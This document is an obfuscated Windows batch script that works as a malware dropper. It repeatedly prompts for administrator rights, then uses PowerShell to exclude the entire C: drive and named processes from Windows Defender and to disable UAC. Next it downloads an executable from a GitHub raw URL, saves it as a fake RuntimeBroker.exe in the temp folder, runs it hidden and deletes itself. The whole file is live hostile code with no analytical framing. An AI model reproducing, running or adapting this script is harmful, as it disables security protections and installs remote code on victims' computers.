@echo off & setlocal enableDelayedExpansion
set "HUdIf=SESSION" & set "uzFfh=>nul" & set "shD=2>&1" & set "TMBvJ=NET"
%TMBvJ% %HUdIf% %uzFfh% %shD%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "BCP=bar" & set "axVRJ=baz" & set "VJg=qux" & set "edkq=foo" & rem FBP yPEHT fkPPQkk
set "oqoLd=powershell -ExecutionPolicy Bypass -Command"
set "ckWUL=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!oqoLd! "!ckWUL!" %uzFfh% %shD%
set "aEoP=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
!oqoLd! "!aEoP!" %uzFfh% %shD%
set "fgZG=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!oqoLd! "!fgZG!" %uzFfh% %shD%
if !errorlevel! neq 0 (goto %a%)
set "abd=timeout /t" & !abd! 2 %uzFfh% %shD%
set "ueTjP=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!oqoLd! "!ueTjP!" %uzFfh% %shD%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!abd! 1 %uzFfh% %shD% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %uzFfh% %shD%
del /f /q "%~f0" %uzFfh% %shD%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %uzFfh% %shD%
if !errorlevel! neq 0 (!abd! 3 %uzFfh% %shD% & goto %b%)
exit /b
